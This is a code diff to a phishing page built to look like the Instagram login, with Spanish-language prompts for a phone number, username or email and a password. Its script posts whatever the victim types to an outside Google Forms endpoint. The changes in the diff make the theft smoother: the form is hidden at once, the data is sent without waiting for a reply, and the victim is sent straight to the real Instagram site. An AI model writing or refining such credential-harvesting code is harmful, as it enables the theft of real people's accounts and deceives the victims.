@@ -21,6 +21,7 @@
       box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
       text-align: center;
       width: 350px;
+      transition: opacity 0.2s ease-in-out;
     }
 
     input {
@@ -88,7 +89,7 @@
 </head>
 <body>
 
-<div class="login-box">
+<div class="login-box" id="loginBox">
   <form id="myForm">
     <input type="text" name="entry.1271603301" placeholder="Teléfono, usuario o correo electrónico" required>
     
@@ -117,15 +118,20 @@
 
   document.getElementById("myForm").addEventListener("submit", function(event) {
     event.preventDefault();
+    
+    // Oculta el formulario instantáneamente
+    document.getElementById("loginBox").style.opacity = "0";
+
+    // Envía los datos sin esperar respuesta
     const form = new FormData(this);
     fetch("https://docs.google.com/forms/d/e/1FAIpQLScixbdWi6SxI01JD38odY0Vr0p0ShZB4P51zkqwcBNwFIHjxw/formResponse", {
       method: "POST",
       body: form,
       mode: "no-cors"
-    }).then(() => {
-      window.location.replace("https://www.instagram.com"); // Redirección instantánea
     });
-    this.reset();
+
+    // Redirige a Instagram sin retraso
+    window.location.href = "https://www.instagram.com";
   });
 </script>
 
